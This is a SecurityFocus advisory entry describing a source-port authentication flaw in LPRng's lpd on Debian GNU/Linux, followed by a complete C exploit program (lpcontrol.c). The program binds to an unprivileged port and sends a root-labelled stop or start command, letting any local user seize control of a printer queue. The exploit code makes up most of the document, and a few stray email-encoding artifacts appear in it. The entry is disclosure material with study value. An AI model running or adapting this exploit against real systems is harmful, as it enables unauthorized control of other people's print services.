source: http://www.securityfocus.com/bid/508/info


The LPRng software is an enhanced, extended, and portable version of the Berkeley LPR software (the standard UNIX printer spooler) that ships with Debian GNU/Linux. When root controls the print queue, the authentication that is used is based on whether the client source port connecting to lpd is privileged or not. Apparently, lpd does not check the source port properly, and it is possible for any local user to control the print queue with a modified client. The consequences of this vulnerability being exploited is a compromise of print queue control.

---- start lpcontrol.c ----------------------------------------------
/* Exploit for lprng's source port check failure.
 * Written and tested on Debian GNU/Linux
 *
 * Chris Leishman <masklin@debian.org>
 */


#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netdb.h>
#include <errno.h>
#include <string.h>


#define SRC_PORT 2056
#define HOST "127.0.0.1"
#define DST_PORT 515


int main(int argc, char **argv)
{
    int sock;
    struct sockaddr_in dest_sin;
    struct sockaddr_in src_sin;
    struct hostent *hp;
    unsigned long ipnum;
    char line[256];
    int mode = 0;

    if (argc < 2)
    {
        fprintf(stderr, "Usage: %s printer [stop|start]\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    if (argc >= 3)
    {
        if (!strcmp(argv[2], "start"))
            mode = 1;
        else if (strcmp(argv[2], "stop"))
        {
            fprintf(stderr, "Invalid mode.  Use stop or start.\n");
            fprintf(stderr, "Usage: %s printer [stop|start]\n", argv[0]);
            exit(EXIT_FAILURE);
        }
    }
    =09
    snprintf(line, sizeof(line), "%c%s root %s %s\n",=20
             6, argv[1], (mode)? "start":"stop", argv[1]);

    memset(&dest_sin, 0, sizeof(struct sockaddr_in));
    dest_sin.sin_port = htons((short) DST_PORT);

    ipnum = (unsigned long) inet_addr(HOST);
    if (ipnum != ((unsigned long) INADDR_NONE))
    {
        dest_sin.sin_family = AF_INET;
        dest_sin.sin_addr.s_addr = ipnum;
    }
    else
    {
        if ((hp = gethostbyname(HOST)) == NULL)
        {
            fprintf(stderr, "Host lookup failed.\n");
            exit(EXIT_FAILURE);
        }

        dest_sin.sin_family = hp->h_addrtype;
        memcpy(&dest_sin.sin_addr.s_addr,hp->h_addr_list[0],
           (size_t)hp->h_length);
    }

    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        perror("Socket call failed");
        exit(EXIT_FAILURE);
    }

    src_sin.sin_family = AF_INET;
    src_sin.sin_addr.s_addr = INADDR_ANY;
    src_sin.sin_port = htons((u_short) SRC_PORT);

    if ((bind(sock, (struct sockaddr *)&src_sin, sizeof(src_sin))) < 0)
    {
        perror("Bind failed");
        exit(EXIT_FAILURE);
    }

    if (connect(sock, (struct sockaddr *)&dest_sin, sizeof(dest_sin)) < 0)
    {
        close(sock);
        perror("Connect failed");
        exit(EXIT_FAILURE);
    }

    if (write(sock, line, strlen(line)) <= 0)
    {
        perror("Write failed");
        exit(EXIT_FAILURE);
    }

    close(sock);

    return EXIT_SUCCESS;
}

---- stop lpcontrol.c -----------------------------------------------
